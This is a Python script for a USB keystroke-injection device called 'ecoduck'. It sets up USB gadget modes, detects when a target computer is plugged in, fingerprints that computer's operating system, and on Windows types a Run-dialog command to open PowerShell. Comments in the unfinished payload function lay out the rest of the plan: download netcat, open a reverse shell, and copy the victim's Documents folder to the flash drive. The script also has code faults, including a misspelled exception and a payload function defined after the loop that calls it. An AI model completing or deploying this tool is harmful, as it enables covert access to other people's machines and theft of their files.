from ecoduck import eco

import os,signal,io
from time import sleep
from subprocess import Popen, PIPE, check_output




def wait_till_disconnect():
	# Loops till electrical tests fails
	print("Waiting for device removal")
	while(electrical_test("/dev/hidg0",1)):
		sleep(3)
	print("Disconnected!")


def timeout_handler():
	# Helper function for electrical_test
	raise Execption("Timeout")

def electrical_test(path, timeout):
	# Checks for a led HID packet from the host - proves target is connected, then resets capslock if it is on
	signal.signal(signal.SIGALRM, timeout_handler)
	signal.alarm(timeout)
	try:
		write_report(b'\x00\x00\x39\x00\x00\x00\x00\x00',"/dev/hidg0")
		write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00',"/dev/hidg0")
		fd = os.open(path, os.O_RDWR)
		state=os.read(fd,4)
		os.close(fd)
		if(state == b'\x02'):
			write_report(b'\x00\x00\x39\x00\x00\x00\x00\x00',"/dev/hidg0")
			write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00',"/dev/hidg0")
			fd = os.open(path, os.O_RDWR)
			state=os.read(fd,4)
			os.close(fd)
	except:
		return False
	signal.alarm(0)
	return True

def get_last_lease():
	fd = io.open("/var/lib/misc/dnsmasq.leases", "r")
	firstline = fd.readline()
	columns=firstline.split(" ")
	print("Found target IP: " + columns[2])
	return columns[2]




# Ensures simple gadget is selected
__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC 2>/dev/null")
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/null")
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
print("Waiting for connection...")
while(1):
	if(electrical_test("/dev/hidg0", 1)):
		print("Device connected to target")
		# OS Fingerprinting
		detectedos = check_output(__location__+"/fingerprint-host.sh").decode()[:-1]
		if "Windows" == detectedos:
			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
		else:
			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
		path=check_output("/bin/ls /dev/hidg*",shell=True).decode()[:-1]
		print("HID Path is: " + path)
		print("Target OS is: " + detectedos)
		sleep(2)
		if "Windows" == detectedos:
			payload()
		print("Payload completed")
		# Switch back to simple gadget
		if "Windows" == detectedos:
			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
		else:
			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
		sleep(2)
		wait_till_disconnect()

def payload():
	# Setup HTTP Server on ./http
	eco.press("LGUI+R")
	sleep(1)
	eco.type("powershell")
	eco.press("ENTER")
	# Open command prompt
	# Download netcat
	# Run netcat reverse shell
	# Connect to shell with sockets
	# Copy Documents Directory to Flash Drive